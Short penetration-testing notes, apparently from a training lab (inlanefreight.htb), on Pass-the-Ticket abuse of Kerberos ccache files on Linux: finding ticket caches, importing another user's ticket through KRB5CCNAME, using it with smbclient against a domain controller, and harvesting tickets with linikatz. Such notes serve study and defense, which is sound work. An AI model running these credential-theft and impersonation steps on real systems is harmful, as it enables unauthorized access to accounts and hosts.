---
title: 'PTT : Abusing KeyTab ccache'
date: 2025-11-29 21:27:07
categories:
  - Active Directory
  - Linux
  - Post Exploitation
  - Pass the Ticket (Ptt)
  - KeyTab Ccache Abuse 

tags:
  - klist
  - ccache

cover: /img/ptt.png
top_img: /img/bg-img.jpg
description:
---


# Finding ccache files

#### Reviewing environment variables for ccache files.

```bash
env | grep -i krb5

KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
```

#### Searching for ccache files in /tmp

`➜ if we gain access as root or a privileged user, we would be able to impersonate a user using their `ccache` file while it is still valid.`

```bash
ls -la /tmp

-rw-------  1 julio@inlanefreight.htb  domain users@inlanefreight.htb 1406 Oct  6 16:38 krb5cc_647401106_tBswau
-rw-------  1 david@inlanefreight.htb  domain users@inlanefreight.htb 1406 Oct  6 15:23 krb5cc_647401107_Gf415d
-rw-------  1 carlos@inlanefreight.htb domain users@inlanefreight.htb 1433 Oct  6 15:43 krb5cc_647402606_qd2Pfh
```



# Abusing KeyTab ccache

#### Note:

`➜ Note: We need root access to impersonate a user using a ccache file, since ccache files are readable only by their owners.`

#### Importing the ccache file into our current session

```bash
export KRB5CCNAME=/tmp/root/krb5cc_647401106_I8I133
```

```bash
klist

Ticket cache: FILE:/root/krb5cc_647401106_I8I133
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/07/2022 13:25:01  10/07/2022 23:25:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/08/2022 13:25:01
```

Example

```bash
smbclient //dc01/C$ -k -c ls -no-pass
```

# Automated Harvesting Of Ccache Files

## Linikatz

`➜ It requires root access and extracts credentials (including Kerberos tickets) from services like FreeIPA, SSSD, Samba, and others.`


```bash
[!bash!]$ /opt/linikatz.sh


Valid starting       Expires              Service principal
10/10/2022 19:48:03  10/11/2022 05:48:03  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
    renew until 10/11/2022 19:48:03, Flags: RIA
    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
I: [kerberos-check] User Kerberos tickets
Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux
Default principal: julio@INLANEFREIGHT.HTB
```